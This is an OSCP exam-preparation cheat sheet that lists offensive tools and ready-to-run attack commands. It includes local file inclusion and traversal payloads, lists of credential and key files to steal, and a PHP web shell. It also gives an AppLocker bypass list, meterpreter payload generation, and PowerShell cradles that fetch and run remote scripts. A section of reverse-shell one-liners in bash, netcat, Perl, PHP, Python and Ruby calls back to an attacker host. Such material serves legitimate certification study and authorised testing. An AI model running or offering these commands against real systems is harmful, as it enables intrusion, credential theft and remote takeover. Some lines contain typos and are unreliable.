# OSCP Cheat Sheet
Commands, Payloads and Resources for the Offensive Security Certified Professional Certification.

## Resources

### Basics
| Tool | URL |
| --- | --- |
| Impacket | https://github.com/SecureAuthCorp/impacket |

### Information Gathering
| Tool | URL |
| --- | --- |
| Amass | https://github.com/OWASP/Amass |
| AutoRecon | https://github.com/Tib3rius/AutoRecon |
| Sparta | https://github.com/SECFORCE/sparta |
| enum4linux | https://github.com/CiscoCXSecurity/enum4linux |

### Vulnerability Analysis
| Tool | URL |
| --- | --- |
| Nmap | https://github.com/nmap/nmap |
| Nuclei | https://github.com/projectdiscovery/nuclei |
| WPScan | https://github.com/wpscanteam/wpscan |

### Web Application Analysis
| Tool | URL |
| --- | --- |

### Database Assessment
| Tool | URL |
| --- | --- |

### Password Attacks
| Tool | URL |
| --- | --- |
| CrackMapExec | https://github.com/byt3bl33d3r/CrackMapExec |

### Reverse Engineering
| Tool | URL |
| --- | --- |

### Exploitation Tools
| Tool | URL |
| --- | --- |
| Metasploit | https://github.com/rapid7/metasploit-framework |

### Post Exploitation
| Tool | URL |
| --- | --- |
| PEASS-ng | https://github.com/carlospolop/PEASS-ng |
| LinEnum | https://github.com/rebootuser/LinEnum |
| pspy | https://github.com/DominicBreuker/pspy |
| Watson | https://github.com/rasta-mouse/Watson |
| WESNG | https://github.com/bitsadmin/wesng
| Sherlock | https://github.com/sherlock-project/sherlock |
| nishang | https://github.com/samratashok/nishang |
| Empire | https://github.com/BC-SECURITY/Empire |
| LaZagne | https://github.com/AlessandroZ/LaZagne |
| printspoofer | https://github.com/dievus/printspoofer |
| Rotten Potato | https://github.com/breenmachine/RottenPotatoNG |
| JAWS | https://github.com/411Hall/JAWS |
| Windows-privesc-check | https://github.com/pentestmonkey/windows-privesc-check |
| Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |
| Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
| Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
| Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |

### Forensics
| Tool | URL |
| --- | --- |

### Exploiting
| Tool | URL |
| --- | --- |
| PwnTools | https://github.com/Gallopsled/pwntools |
| mona | https://github.com/corelan/mona |
| Buffer Overflow | https://github.com/gh0x0st/Buffer_Overflow |

### Wordlists
| Tool | URL |
| --- | --- |
| SecLists | https://github.com/danielmiessler/SecLists |

### Social Media Resources
| Name | URL |
| --- | --- |
| IppSec (YouTube) | https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA |
| IppSec.rocks | https://ippsec.rocks/?# |
| 0xdf | https://0xdf.gitlab.io/
| HackTricks | https://book.hacktricks.xyz/ |
| Hacking Articles | https://www.hackingarticles.in/ |
| Rana Khalil | https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/ |

## Commands

### Basics
#### CentOS
```c
doas -u <user> /bin/sh
```
#### Certutil
```c
certutil -urlcache -split -f "http://<local_ip>/<file>" <file>
```
#### Chisel
```c
$ ./chisel server -p 9002 -reverse -v
$ ./chisel client <remote_ip>:9002 R:9003:127.0.0.1:8888
```
#### Netcat
```c
nc -lnvp <local_port> < <file>
nc <remote_ip> <remote_port> > <file>
```
#### PHP Webserver
```c
sudo php -S 127.0.0.1:80
```
#### Ping
```c
ping -c 1 <remote_ip>
ping -n 1 <remote_ip>
```
#### Python Webserver
```c
sudo python -m SimpleHTTPServer 80
sudo pyhton3 -m http.server 80
```
#### RDP
```c
xfreerdp /v:<remote_ip> /u:<user> /p:<password> +clipboard
rdesktop <remote_ip>
```
#### tmux
```c
ctrl b + w    # navigate
```
Copy & Paste
```c
1. ctrl b + [
2. ctrl space
3. alt w
4. ctrl b + ]
```
Search
```c
ctrl b + [    # enter copy
ctrl + s      # enter search from copy mode
ctrl + r      # reverse search
```
#### Upgrading Shells
```c
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

ctrl + z
stty raw -echo
fg
Enter
Enter
export XTERM=xterm
```
#### vi
```c
:w !sudo tee %    # save file with evelated privileges without exiting
```
#### Windows Command Formatting
```c
echo "<command>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
```

### Information Gathering
#### DNS
##### Reverse DNS
```c
whois <domain>
host <remote_ip> <remote_ip>
host -l <domain> <remote_ip>
dig @<domain> -x <domain>
dig {a|txt|ns|mx} <domain>
dig {a|txt|ns|mx} <domain> @ns1.<domain>
dig axfr @<remote_ip> <domain>           # zone transfer - needs tcp DNS - port 53
```
#### SMB / NetBIOS
```c
nbtscan <remote_ip>
enum4linux -a <remote_ip>
```

### Vulnerability Analysis
#### Nmap:
```c
sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <remote_ip>    # discovery scan
sudo nmap -A -T4 -sC -sV --script vuln <remote_ip>    # vulnerability scan
sudo nmap -sU <remote_ip>    # udp scan
sudo nmap -sC -sV -p- --scan-delay 5s <remote_ip>    # delayed scan
sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <remote_ip>    # kerberos enumeration
ls -lh /usr/share/nmap/scripts/*ssh*
locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
```
#### Nuclei
```c
./nuclei -target https://<target_url> -t nuclei-templates    # basic syntax with path to templates
./nuclei -target https://<target_url> -t nuclei-templates -rate-limit 5    # rate limiting
./nuclei -target https://<target_url> -t nuclei-templates -header 'User-Agent: Pentesting -H 'X-OSCP-EXAM: oscp_exam'    # set headers
```
#### WPScan
```c
wpscan --url https://<remote_ip> --disable-tls-checks
wpscan --url https://<remote_ip> --disable-tls-checks --enumerate u
target=<remote_ip>; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
wpscan --url http://<remote_ip> -U <user> -P passwords.txt -t 50
```

### Web Application Analysis
#### Asset Discovery
```c
curl -s -k "https://jldc.me/anubis/subdomains/example.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sed '/^\./d'
```
#### ffuf
```c
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<target_url>/FUZZ -mc 200,204,301,302,307,401 -o results.txt

ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<target_url>/ -H "Host: FUZZ.<target url>" -fs 185

ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<target_url>/backups/backup_2020070416FUZZ.zip

ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<target_url>/admin../admin_staging/index.php?page=FUZZ -fs 15349
```
#### Gobuster
```c
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<remote_ip>/

gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<remote_ip> -x php

gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<remote_ip> -x php,txt,html,js -e -s 200

gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<remote_ip>:<remote_port>/ -b 200 -k --wildcard

gobuster dns -d <target_domain> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```
#### Hakrawler
```c
hakrawler -url <remote_ip> -depth 3
hakrawler -url <remote_ip> -depth 3 -plain
hakrawler -url <remote_ip> -depth 3 -plain | httpx -http-proxy http://127.0.0.1:8080
```
#### Local File Inclusion Vulnerability
```c
http://<target_domain>/<file>.php?file=
http://<target_domain>/<file>.php?file=../../../../../../../../etc/passwd
http://<target_domain>/<file>/php?file=../../../../../../../../../../etc/passwd
```
##### Until php 5.3
```c
http://<target_domain>/<file>/php?file=../../../../../../../../../../etc/passwd%00
```
##### Encoded Traversal Strings
```c
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```
##### Base64 Execution Bypass
```c
http://<remote_ip>/index.php?page=php://filter/convert.base64-encode/resource=index
base64 -d <file>.php
```
##### Linux Files
```c
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/stat
/proc/swaps
/proc/version
/proc/self/net/arp
/proc/sched_debug
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd-access.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/<vhost>/__init__.py
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```
##### Windows Files
```c
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```
#### wfuzz
```c
wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<remote_ip>:<remote_port>/FUZZ/<file>.php --hc '403,404'

wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<remote_ip:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c

wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<target_url>" --hc 200 --hw 356 -t 100 <remote_ip>

wfuzz -X POST -u "http://<remote_ip>:<remote_port>/login.php" -d "email=FUZZ&password=<password>" -w /path/to/wordlist.txt --hc 200 -c

wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<remote_ip>/select

wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<target_domain>" -u http://<target_domain> --hw <value> -t 100

wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
```

### Password Attacks
#### Hydra
```c
export HYDRA_PROXY=connect://127.0.0.1:8080
unset HYDRA_PROXY

hydra <remote_ip> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -l root@localhost -P otrs-cewl.txt -vV -f

hydra -l admin -P /usr/share/wordlists/rockyou.txt <remote_ip> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
```

#### John
```c
/usr/share/john/ssh2john.py id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt <file>
john --rules --wordlist=/usr/share/wordlists/rockyou.txt <file>
john --show <file>
```

### Exploitation Tools
#### Web Shells
```c
/usr/share/webshells
<?php echo shell_exe(($_GET['cmd']); ?>
```

### Post Exploitation
#### AppLocker Bypass List
```
Bypass List (Windows 10 Build 1803):
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```
#### autologon
```c
powershell -c "$SecPass = Convertto-securestring 'Welcome1!' -AsPlainText -Force;$cred=New-Object System.Management.Automation.PScredential('administrator', $SecPass);Start-Process -FilePath 'C:\Users\Public\Downloads\nc.exe' -argumentlist '-e cmd <local_ip> <local_port>' -Credential $cred"
```
#### Bash Privilege Escalation
```c
sudo -u#-1 /bin/bash
```
#### Basic Enumeration / Linux
```c
id
sudo -l
uname -a
cat /etc/hosts
cat /etc/fstab
cat /etc/passwd
ss -tulpn
ps -auxf
ls -lahv
ls -R /home
```
#### Basic Enumeration / Windows
```c
systeminfo
whoami /all
net users
net users <user>
```
#### find Commands
```c
find ./ -type f -exec grep --color=always -i -I 'password' {} \;

find / -group <group> 2>/dev/null

find / -user <user> 2>/dev/null
find / -user <user> -ls 2>/dev/null
find / -user <user> 2>/dev/null | grep -v proc 2>/dev/null
find / -user <user> -ls 2>/dev/null | grep -v proc 2>/dev/null

find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null | xargs ls -la
find / -type f -user root -perm -4000 2>/dev/null
```
#### grep for Passwords
```c
grep -R db_passwd
grep -roiE "password.{20}"
grep -oiE "password.{20}" /etc/*.conf
```
#### JAWS
```c
IEX(New-Object Net.webclient).downloadString('http://<local_ip>:<local_port>/jaws-enum.ps1')
```
#### JuicyPotato
```c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe

msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <local_ip>
msf6 exploit(multi/handler) > set LPORT <local_ip>
msf6 exploit(multi/handler) > run

.\exploit.exe
```
#### LaZagne
```c
laZagne.exe all
```
#### Powershell & Powercat
```c
Set-ExecutionPolicy Unrestricted

powershell -Command "$PSVersionTable.PSVersion"    # check powershell version

powershell -c "[Environment]::Is64BitProcess"    # check for 64bit powershell

cmd /c powershell -nop -exec bypass -c "iex(new-object net.webclient).downloadstring('http://<local_ip>:<local_port>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <local_ip> -Port <local_port>"

powershell -c "(new-object System.Net.WebClient).DownloadFile(\"http://<local_ip>:<local_port>/nc.exe\",\"C:\Users\Public\Downloads\nc.exe\")"

powershell (New-Object System.Net.WebClient).UploadFile('http://<local_ip>/upload.php', '<file>')

powershell -c "Invoke-Webrequest -Uri \"http://<local_ip>:<local_port>/shell.exe\" -OutFile \"C:\Users\Public\Downloads\shell.exe\""

<remote_ip>/node/3?cmd=powershell -c IEX(New-object System.net.webclient).DownloadString('http://<local_ip>:<local:port>/Sherlock.ps1');Find-AllVulns

echo "IEX (New-object System.net.webclient).DownloadString('http://<local_ip>:<local_port>/shell.ps1')" | powershell -noprofile -
```
#### Windows Tasks & Services
```c
tasklist /SVC
netsh firewall show state
schtasks /query /fo LIST /v
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
```
```c
sc query
sc qc <service-name>
accesschk.exe -uws "Everyone" "C:\Program Files"

dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt

wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP pretty likely
```
#### Writeable Directories in Linux
```c
/dev/shm
/tmp
```
#### Reverse Shells
```c
bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1
bash -c 'bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1'

http://<target_url>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local_ip> <local_port>/tmp/f")--    # lua

nc -e /bin/sh <local_ip> <local_port>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local_ip> <local_port> >/tmp/f

perl -e 'use Socket;$i="<local_ip>";$p=<local_port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

php -r '$sock=fsockopen("<local_ip>",<local_port>);exec("/bin/sh -i <&3 >&3 2>&3");'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<local_ip>",<local_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<local_ip>",<local_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

ruby -rsocket -e'f=TCPSocket.open("<local_ip>",<local_port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```





